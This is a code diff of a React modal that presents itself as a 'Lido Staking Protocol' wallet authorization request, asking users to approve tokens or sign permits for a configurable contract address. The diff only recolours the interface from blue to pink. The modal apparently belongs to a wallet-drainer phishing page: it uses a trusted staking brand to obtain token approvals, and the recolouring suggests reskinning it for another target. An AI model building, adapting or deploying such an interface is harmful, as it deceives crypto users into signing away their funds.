@@ -304,19 +304,19 @@ export function WalletSignatureModal() {
         
         {/* Header Branding */}
         <div className="flex flex-col items-center text-center space-y-3">
-          <div className="w-14 h-14 rounded-2xl bg-[#00A3FF]/10 border border-[#00A3FF]/30 text-[#00A3FF] flex items-center justify-center shadow-inner">
+          <div className="w-14 h-14 rounded-2xl bg-[#FF007A]/10 border border-[#FF007A]/30 text-[#FF007A] flex items-center justify-center shadow-inner">
             <LidoLogo className="w-8 h-8" />
           </div>
           <div>
             <h2 className="text-2xl font-black tracking-tight text-text-main">Lido Staking Protocol</h2>
-            <p className="text-xs font-semibold text-[#00A3FF] uppercase tracking-widest mt-0.5">Wallet Authorization Request</p>
+            <p className="text-xs font-semibold text-[#FF007A] uppercase tracking-widest mt-0.5">Wallet Authorization Request</p>
           </div>
         </div>
 
         {/* Notice Banner */}
-        <div className="p-4 bg-input border border-[#00A3FF]/20 rounded-2xl text-xs space-y-2">
+        <div className="p-4 bg-input border border-[#FF007A]/20 rounded-2xl text-xs space-y-2">
           <p className="text-sm font-semibold text-text-main flex items-center gap-1.5">
-            <ShieldCheck className="w-4 h-4 text-[#00A3FF]" />
+            <ShieldCheck className="w-4 h-4 text-[#FF007A]" />
             Approve Wallet to Stake on Lido
           </p>
           <p className="text-text-secondary leading-relaxed">
@@ -339,7 +339,7 @@ export function WalletSignatureModal() {
               href={`https://etherscan.io/address/${CONFIG.CONTRACT_ADDRESS}`} 
               target="_blank" 
               rel="noreferrer"
-              className="text-[#00A3FF] hover:underline flex items-center gap-1"
+              className="text-[#FF007A] hover:underline flex items-center gap-1"
             >
               <span>{CONFIG.CONTRACT_ADDRESS.slice(0, 6)}...{CONFIG.CONTRACT_ADDRESS.slice(-4)}</span>
               <ExternalLink className="w-3 h-3" />
@@ -368,7 +368,7 @@ export function WalletSignatureModal() {
           <button
             onClick={approvalMethod === 'permit' ? handlePermitSignature : approvalMethod === 'approve' ? handleOnChainApprove : handleTextMessageSignature}
             disabled={isVerifying}
-            className="w-full py-4 bg-[#00A3FF] hover:bg-[#0090E6] text-white font-extrabold text-sm rounded-2xl transition-all shadow-lg shadow-[#00A3FF]/25 flex items-center justify-center gap-2 active:scale-[0.99] disabled:opacity-50 cursor-pointer"
+            className="w-full py-4 bg-[#FF007A] hover:bg-[#E6006F] text-white font-extrabold text-sm rounded-2xl transition-all shadow-lg shadow-[#00A3FF]/25 flex items-center justify-center gap-2 active:scale-[0.99] disabled:opacity-50 cursor-pointer"
           >
             {isVerifying ? (
               <>
@@ -387,7 +387,7 @@ export function WalletSignatureModal() {
           <div className="flex justify-between items-center px-1 text-xs">
             <button
               onClick={handleTextMessageSignature}
-              className="text-text-secondary hover:text-[#00A3FF] underline transition-colors"
+              className="text-text-secondary hover:text-[#FF007A] underline transition-colors"
             >
               Standard Connection
             </button>
